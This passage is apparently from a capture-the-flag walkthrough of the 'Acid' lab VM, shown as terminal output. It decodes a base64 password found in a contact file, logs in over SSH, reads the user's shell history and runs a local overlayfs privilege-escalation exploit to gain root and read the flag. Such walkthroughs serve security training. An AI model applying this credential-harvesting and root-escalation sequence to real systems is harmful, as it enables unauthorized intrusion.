+	<c:ContactIDCollection><c:ContactID c:ElementID="599ef753-f77f-4224-8700-e551bdc2bb1e"><c:Value>0bcf610e-a7be-4f26-9042-d6b3c22c9863</c:Value></c:ContactID></c:ContactIDCollection><c:EmailAddressCollection><c:EmailAddress c:ElementID="0745ffd4-ef0a-4c4f-b1b6-0ea38c65254e"><c:Type>SMTP</c:Type><c:Address>acid.exploit@gmail.com</c:Address><c:LabelCollection><c:Label>Preferred</c:Label></c:LabelCollection></c:EmailAddress><c:EmailAddress c:ElementID="594eec25-47bd-4290-bd96-a17448f7596a" xsi:nil="true"/></c:EmailAddressCollection><c:NameCollection><c:Name c:ElementID="318f9ce5-7a08-4ea0-8b6a-2ce3e9829ff2"><c:FormattedName>Avinash</c:FormattedName><c:GivenName>Avinash</c:GivenName></c:Name></c:NameCollection><c:PersonCollection><c:Person c:ElementID="865f9eda-796e-451a-92b1-bf8ee2172134"><c:FormattedName>Makke</c:FormattedName><c:LabelCollection><c:Label>wab:Spouse</c:Label></c:LabelCollection></c:Person></c:PersonCollection><c:PhotoCollection><c:Photo c:ElementID="2fb5b981-cec1-45d0-ae61-7c340cfb3d72"><c:LabelCollection><c:Label>UserTile</c:Label></c:LabelCollection></c:Photo></c:PhotoCollection></c:contact>
+root@kali:~/Desktop/strcpy/lol# cat hint.txt 
+You have found a contact. Now, go and grab the details :-)
+
+root@kali:~/Desktop/strcpy/lol# 
+"AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=" seems like a base64 string
+root@kali:~# echo "AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=" | base64 -d
+NooB@123
+root@kali:~# 
+2 more names form the Avinash.contact file are -> Avinash, Makke
+
+8.) Brute force SSH
+Username: makke
+Password: NooB@123
+root@kali:~# ssh makke@192.168.174.132
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+									-by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+                                                                              
+makke@192.168.174.132's password: 
+Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+195 packages can be updated.
+110 updates are security updates.
+
+Last login: Mon Aug 24 21:25:34 2015 from 192.168.88.236
+makke@acid:~$ pwd
+/home/makke
+makke@acid:~$ whoami
+makke
+makke@acid:~$ ls -lah
+total 32K
+drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
+drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
+-rw------- 1 makke makke  205 Aug 24 21:31 .bash_history
+-rw-r--r-- 1 makke makke  220 Aug 24 19:11 .bash_logout
+-rw-r--r-- 1 makke makke 3.7K Aug 24 19:11 .bashrc
+drwx------ 2 makke makke 4.0K Aug 24 21:25 .cache
+-rw-rw-r-- 1 makke makke   40 Aug 24 21:28 .hint
+-rw-r--r-- 1 makke makke  675 Aug 24 19:11 .profile
+makke@acid:~$ cat .bash_history
+exit
+cd ..
+clear
+cd /
+ls
+cd bin/
+clear
+./overlayfs 
+clear
+cd /home/makke/
+clear
+nano .hint
+clear
+ls
+clear
+ls
+ls -a
+cat .hint 
+clear
+cd /bin/
+ls
+./overlayfs 
+clear
+wgt
+wget
+apt-get remove wget
+su
+su -
+exit
+makke@acid:~$ cat .hint
+Run the executable to own kingdom :-)
+makke@acid:~$ cd /bin/
+makke@acid:/bin$ ./overlayfs 
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+# whoami
+root
+#
+# cd /
+# ls -lah
+total 100K
+drwxr-xr-x  22 root     root     4.0K Aug 24 20:58 .
+drwxr-xr-x  22 root     root     4.0K Aug 24 20:58 ..
+drwxr-xr-x   3 root     root     4.0K Aug 24 21:23 bin
+drwxr-xr-x   3 root     root     4.0K Aug 24 17:53 boot
+drwxrwxr-x   2 root     root     4.0K Jul 31 17:13 cdrom
+drwxr-xr-x  18 root     root     4.2K Nov 20 07:57 dev
+drwxr-xr-x 130 root     root      12K Nov 20 10:47 etc
+drwxr-xr-x   4 root     root     4.0K Aug 24 19:11 home
+lrwxrwxrwx   1 root     root       33 Jul 31 17:18 initrd.img -> boot/initrd.img-3.19.0-15-generic
+drwxr-xr-x  23 root     root     4.0K Aug 24 17:52 lib
+drwx------   2 root     root      16K Jul 31 17:07 lost+found
+drwxr-xr-x   4 www-data www-data 4.0K Aug  8 10:58 media
+drwxr-xr-x   3 root     root     4.0K Aug  5 14:48 mnt
+drwxr-xr-x   2 root     root     4.0K Apr 22  2015 opt
+dr-xr-xr-x 195 root     root        0 Nov 20 07:57 proc
+drwx------   5 root     root     4.0K Aug 24 21:32 root
+drwxr-xr-x  27 root     root      920 Nov 20 10:41 run
+drwxr-xr-x   3 root     root      12K Aug 24 17:52 sbin
+drwxr-xr-x   2 root     root     4.0K Apr 22  2015 srv
+dr-xr-xr-x  13 root     root        0 Nov 20 07:57 sys
+drwxrwxrwt  10 root     root     4.0K Nov 20 10:47 tmp
+drwxr-xr-x  10 root     root     4.0K Aug  3 16:53 usr
+drwxr-xr-x  14 root     root     4.0K Aug  3 16:46 var
+lrwxrwxrwx   1 root     root       30 Jul 31 17:18 vmlinuz -> boot/vmlinuz-3.19.0-15-generic
+# cd /root
+# ls
+# ls -lah
+total 68K
+drwx------  5 root root 4.0K Aug 24 21:32 .
+drwxr-xr-x 22 root root 4.0K Aug 24 20:58 ..
+-rw-------  1 root root  24K Aug 24 22:25 .bash_history
+-rw-r--r--  1 root root 3.1K Aug  8 18:02 .bashrc
+drwx------  2 root root 4.0K Aug 24 17:46 .cache
+drwx------  3 root root 4.0K Aug  6 17:55 .config
+drwx------  3 root root 4.0K Aug  6 15:51 .dbus
+-rw-r--r--  1 root root  284 Aug 24 20:57 .flag.txt
+-rw-------  1 root root 2.8K Aug 24 21:32 .mysql_history
+-rw-------  1 root root  147 Aug 24 23:32 .nano_history
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-r--r--  1 root root   66 Aug  6 17:31 .selected_editor
+# cat .flag.txt
+Dear Hax0r,
+
+You have completed the Challenge Successfully.
+
+Your Flag is : "Black@Current@Ice-Cream"
+
+Kind & Best Regards
+
+-ACiD
+
+Twitter:https://twitter.com/m_avinash143
+Facebook: https://www.facebook.com/M.avinash143
+LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
+# 
